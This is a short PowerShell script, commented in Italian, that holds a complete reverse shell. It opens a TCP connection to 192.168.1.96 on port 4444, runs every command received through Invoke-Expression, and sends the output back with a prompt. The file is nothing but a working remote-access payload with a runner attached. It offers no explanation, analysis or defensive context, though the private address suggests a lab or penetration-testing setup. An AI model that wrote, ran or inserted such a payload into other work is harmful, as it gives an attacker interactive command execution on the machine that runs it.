# Definisci il payload come stringa
$payload = '
$client = New-Object System.Net.Sockets.TCPClient(''192.168.1.96'', 4444);
$s = $client.GetStream();
$b = New-Object Byte[] 65535;
while ($true) {
    try {
        $bytesRead = $s.Read($b, 0, $b.Length);
        if ($bytesRead -le 0) { break; }
        $data = [System.Text.Encoding]::ASCII.GetString($b, 0, $bytesRead);
        $commandOutput = (Invoke-Expression -Command $data 2>&1 | Out-String);
        $commandOutputBytes = [System.Text.Encoding]::ASCII.GetBytes($commandOutput + ''PS '' + (Get-Location).Path + ''> '');
        $s.Write($commandOutputBytes, 0, $commandOutputBytes.Length);
        $s.Flush();
    }
    catch {
        $s.Close();
        break;
    }
}
'

# Esegui il payload
Invoke-Expression $payload
